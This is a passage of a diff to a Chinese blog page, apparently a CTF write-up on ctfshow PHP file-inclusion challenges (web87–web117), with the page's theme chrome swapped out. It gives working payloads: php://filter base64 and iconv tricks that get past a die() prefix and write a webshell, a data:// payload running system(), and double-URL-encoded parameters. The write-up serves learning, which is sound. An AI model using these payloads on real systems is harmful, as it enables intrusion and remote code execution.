+    event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>若成功+++++++++++done+++++++++++，访问2.php，木马密码是2。</p>
 <p>学习链接：</p>
@@ -322,7 +322,7 @@
 </blockquote>
 <h1 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h1><p>过滤了<code>php</code>、<code>data</code>、<code>:</code>、<code>.</code></p>
 <p>有两个参数：<code>file</code>、<code>content</code> ，只对file进行了过滤。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>); </span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">file_put_contents(urldecode($file), "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'大佬别秀了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>".$content); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <blockquote>
 <p>把<code>&quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;.$content</code>写入文件file。<code>$content</code>在开头增加了<code>die</code>函数，导致即使我们成功写入一句话，程序还是会直接退出，执行不了我们的一句话木马。</p>
@@ -331,17 +331,31 @@
 <p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
 <p>所以，当<code>$content</code>被加上了<code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code>以后，我们可以使用 <strong>php:&#x2F;&#x2F;filter</strong>&#x2F;write&#x3D;convert.<strong>base64-decode</strong> 来首先对其解码。在解码的过程中，字符 &lt;、?、;、&gt;、空格、汉字 等字符不符合base64编码的字符范围将被忽略，所以最终被解码出来的的字符就变成 “phpdie” 和 我们传入的$content的值。</p>
 <p>“phpdie”一共6个字符，因为base64算法解码时是4个byte一组，所以给它增加2个“a”一共8个字符。这样，”phpdieaa”就可以被正常解码，而后面我们传入的<strong>webshell的base64</strong>内容也被正常解码。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET传参：</span><br><span class="line">?file=php://filter/convert.base64-decode/resource=2.php</span><br><span class="line"> 进行url全编码↓</span><br><span class="line">?file=%70%68%70%3A%2F%2F%66%69%6C%74%65%72%2F%63%6F%6E%76%65%72%74%2E%62%61%73%65%36%34%2D%64%65%63%6F%64%65%2F%72%65%73%6F%75%72%63%65%3D%32%2E%70%68%70</span><br><span class="line"> 进行url编码 ↓</span><br><span class="line">?file=%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2532%252e%2570%2568%2570</span><br><span class="line"></span><br><span class="line">POST传参：</span><br><span class="line">content=&lt;?php system(&#x27;cat f*.php&#x27;);?&gt;</span><br><span class="line"> 进行base64编码 ↓</span><br><span class="line">content=PD9waHAgc3lzdGVtKCdjYXQgZioucGhwJyk7Pz4</span><br><span class="line"> 前面要加两个字符a</span><br><span class="line">content=aaPD9waHAgc3lzdGVtKCdjYXQgZioucGhwJyk7Pz4</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">GET传参：
+?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;2.php
+ 进行url全编码↓
+?file&#x3D;%70%68%70%3A%2F%2F%66%69%6C%74%65%72%2F%63%6F%6E%76%65%72%74%2E%62%61%73%65%36%34%2D%64%65%63%6F%64%65%2F%72%65%73%6F%75%72%63%65%3D%32%2E%70%68%70
+ 进行url编码 ↓
+?file&#x3D;%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2532%252e%2570%2568%2570
+
+POST传参：
+content&#x3D;&lt;?php system(&#39;cat f*.php&#39;);?&gt;
+ 进行base64编码 ↓
+content&#x3D;PD9waHAgc3lzdGVtKCdjYXQgZioucGhwJyk7Pz4
+ 前面要加两个字符a
+content&#x3D;aaPD9waHAgc3lzdGVtKCdjYXQgZioucGhwJyk7Pz4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>所以最终的payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2532%252e%2570%2568%2570</span><br><span class="line"></span><br><span class="line">content=aaPD9waHAgc3lzdGVtKCdjYXQgZioucGhwJyk7Pz4</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2532%252e%2570%2568%2570
+
+content&#x3D;aaPD9waHAgc3lzdGVtKCdjYXQgZioucGhwJyk7Pz4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>然后访问2.php，源代码看到flag</p>
 <p>学习链接：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=1#_1">谈一谈php:&#x2F;&#x2F;filter的妙用 | 离别歌 (leavesongs.com)</a></p>
 <h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><p>发现过滤的还是比较多，但是没有过滤<code>:</code> ，那我们就可以使用PHP伪协议就是 这里使用的是 data:&#x2F;&#x2F;text&#x2F;plain;base64,poc 其实和79差不多 只是注意的是编码成base64的时候要去掉 ＝，因为过滤了&#x3D;</p>
 <p>把 &lt;?php system(“cat fl0g.php”); 加密–&gt;PD9waHAg3lzdGVtKCJjYXQgZmwwZy5waHAiKTs&#x3D;，然后去掉&#x3D;</p>
 <p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmwwZy5waHAiKTs</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmwwZy5waHAiKTs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
@@ -349,13 +363,15 @@
 <p>把89504E47之前的字符全部删除，然后保存文件，更改文件后缀为.png，得到源码的png图片。</p>
 <p><img src="/images/mp4.png" alt="mp4"></p>
 <p>因为浏览器看不了网页源代码，我们抓包，发送到repeater模块</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=flag.php</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>得到flag</p>
 <h1 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h1><p>和web87差不多，绕过死亡代码die()，但是过滤了base64，那我们换一种编码方式不就得了</p>
 <p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">PHP: 支持的字符编码 - Manual</a></p>
 <p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=2.php</span><br><span class="line"></span><br><span class="line">contents=?&lt;hp pe@av(l_$OPTSa[aa]a;)&gt;?</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;2.php
+
+contents&#x3D;?&lt;hp pe@av(l_$OPTSa[aa]a;)&gt;?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>然后访问2.php</p>
 <p>post：</p>
@@ -364,278 +380,74 @@
 </blockquote>
 <hr>
 
-    </div>
-
-    
-    
-    
-        
-
-<div>
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>Ja1e
-  </li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    <a href="https://ja1e.github.io/2022/08/09/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="ctfshow_web入门_文件包含">https://ja1e.github.io/2022/08/09/ctfshow文件包含/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
-  </li>
-</ul>
-</div>
-
-
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/CTF/" rel="tag"># CTF</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2022/08/06/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" rel="prev" title="内网穿透">
-      <i class="fa fa-chevron-left"></i> 内网穿透
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2022/08/09/ctfshowssrf/" rel="next" title="ctfshow_web入门_ssrf">
-      ctfshow_web入门_ssrf <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
+  <p><a class="classtest-link" href="/tags/CTF/" rel="tag">CTF</a> — 2022年8月9日</p>
   
 
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
 
         </div>
-          
+        <div class="row mt-2">
+  <h3>Search</h3>
+  <div><input id="search-text" title="search" class="search-text" type="text" placeholder="search......"></div>
+  <div style="margin-top: 1.5rem;">
+    <ul id="result"></ul>
+  </div>
+</div>
+        <div class="row mt-2">
   
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web78"><span class="nav-number">1.</span> <span class="nav-text">web78</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web79"><span class="nav-number">2.</span> <span class="nav-text">web79</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web80"><span class="nav-number">3.</span> <span class="nav-text">web80</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web82"><span class="nav-number">4.</span> <span class="nav-text">web82</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web87"><span class="nav-number">5.</span> <span class="nav-text">web87</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web88"><span class="nav-number">6.</span> <span class="nav-text">web88</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web116"><span class="nav-number">7.</span> <span class="nav-text">web116</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web117"><span class="nav-number">8.</span> <span class="nav-text">web117</span></a></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">Ja1e</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">32</span>
-          <span class="site-state-item-name">日志</span>
+    <div class="eight columns">
+      <p id="madewith">Made with ❤ and
+        <a class="footer-link icon" href="https://hexo.io" target="_blank" style="text-decoration: none;" rel="noreferrer" aria-label="Hexo.io">
+        <svg class="hexo svg-hov" width="14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><title>Hexo.js</title><path d="M12 .007L1.57 6.056V18.05L12 23.995l10.43-6.049V5.952L12 .007zm4.798 17.105l-.939.521-.939-.521V12.94H9.08v4.172l-.94.521-.938-.521V6.89l.939-.521.939.521v4.172h5.84V6.89l.94-.521.938.521v10.222z"/></svg>
         </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">7</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
-        <span class="site-state-item-count">14</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
+        
+    </div>
+
+    <!-- Sepcial thanks to https://simpleicons.org/ for the icons -->
+    <div class="four columns mb-3 posisi" >
+      
+      <a class="ml-0 footer-link icon" href="https://github.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="GitHub">
+        <svg class="github svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+      </a>
+      
+
+      
+
+      
+      <a class="ml-0 footer-link icon" href="https://twitter.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Twitter">
+        <svg class="twitter svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Twitter</title><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>
+      </a>
+      
+
+      
+      <a class="ml-0 footer-link icon" href="https://instagram.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Instagram">
+        <svg class="instagram svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Instagram</title><path d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439z"/></svg>
+      </a>
+      
+
+      
+
+    </div>
+  
 </div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-        <a href="https://github.com/ja1e" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ja1e" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="mailto:eveee428@proton.me" title="E-Mail → mailto:eveee428@proton.me" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-  </div>
-
-
-
+<script src="/js/prism/prism.js" async></script>
       </div>
 
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
 
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2022</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Ja1e</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-area"></i>
-    </span>
-      <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">91k</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">55 分钟</span>
-</div>
-
-
-<!-- 网站运行时间的设置 -->
-<span id="timeDate">载入天数...</span>
-<span id="times">载入时分秒...</span>
-<script>
-    var now = new Date();
-    function createtime() {
-        var grt= new Date("11/23/2021 15:54:40");//此处修改你的建站时间或者网站上线时间
-        now.setTime(now.getTime()+250);
-        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
-        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
-        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
-        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
-        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
-        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
-        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
-        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
-    }
-setInterval("createtime()",250);
-</script>
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-user"></i>
-      </span>
-      <span class="site-uv" title="总访客量">
-        <span id="busuanzi_value_site_uv"></span>
-      </span>
-    </span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="site-pv" title="总访问量">
-        <span id="busuanzi_value_site_pv"></span>
-      </span>
-    </span>
-</div>
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
   </div>
+  <script src="/js/nanobar.min.js"></script>
 
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-  <script defer src="/lib/three/three.min.js"></script>
-    <script defer src="/lib/three/three-waves.min.js"></script>
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
+  <script>
+    var options = {
+      classname: 'nanobar',
+      id: 'myNanobar'
+    };
+    var nanobar = new Nanobar(options);
+    nanobar.go(30);
+    nanobar.go(76);
+    nanobar.go(100);
+  </script>
 
 </body>
+
 </html>
